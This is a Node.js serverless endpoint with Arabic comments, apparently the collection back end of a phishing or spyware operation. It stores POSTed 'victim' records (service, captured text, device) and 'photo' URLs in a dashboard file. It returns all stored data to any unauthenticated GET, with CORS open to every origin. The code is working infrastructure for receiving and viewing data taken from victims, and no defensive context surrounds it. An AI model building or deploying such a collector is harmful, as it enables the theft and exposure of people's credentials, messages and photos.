const fs = require('fs');
const path = require('path');

const DATA_FILE = path.join('/tmp', 'dashboard.json');

function readData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        }
    } catch(e) {}
    return { victims: [], gallery: [] };
}

function writeData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data));
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    
    // حفظ البيانات
    if (req.method === 'POST') {
        try {
            const { type, service, text, url, device } = req.body;
            const data = readData();
            const entry = {
                timestamp: new Date().toISOString(),
                device: device || 'unknown'
            };
            
            if (type === 'victim') {
                entry.service = service || 'غير معروف';
                entry.text = text || '';
                data.victims.push(entry);
            }
            
            if (type === 'photo' && url) {
                entry.url = url;
                entry.type = service || 'صورة';
                data.gallery.push(entry);
            }
            
            writeData(data);
            return res.json({ success: true });
        } catch(e) {
            return res.json({ success: false, error: e.message });
        }
    }
    
    // قراءة البيانات
    if (req.method === 'GET') {
        const data = readData();
        return res.json(data);
    }
    
    res.json({ status: 'ok' });
};
